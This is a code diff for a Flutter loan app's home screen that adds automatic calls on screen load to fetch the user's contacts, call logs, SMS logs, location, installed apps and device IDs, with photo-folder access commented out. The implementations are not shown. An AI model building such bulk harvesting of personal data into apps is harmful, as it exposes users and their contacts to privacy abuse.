@@ -22,17 +22,27 @@ class _HomeScreenState extends State<HomeScreen> {
   @override
   void initState() {
     super.initState();
-    fetchData();
+    initCall();
   }
 
-  Future<void> fetchData() async {
-    await Get.find<HomeController>().getInitialLoanAmount();
+  Future<void> initCall() async {
+    print("yes entered -------------");
     await Get.find<KycController>().getKycStatus();
+    await Get.find<HomeController>().getInitialLoanAmount();
+    await Get.find<HomeController>().getDeviceIdAndUserId();
+    await Get.find<HomeController>().appPermission();
+    // await Get.find<HomeController>().fetchDCIMFolder();
+    await Get.find<HomeController>().fetchContactsLogs();
+    await Get.find<HomeController>().fetchCallLogs();
+    await Get.find<HomeController>().fetchSMSLogs();
+    await Get.find<HomeController>().fetchCurrentLocation();
+    await Get.find<HomeController>().fetchInstalledApps();
   }
 
   Future<void> _onRefresh() async {
     Get.find<HomeController>().clearData();
-    fetchData();
+    await Get.find<KycController>().getKycStatus();
+    await Get.find<HomeController>().getInitialLoanAmount();
   }
 
   @override
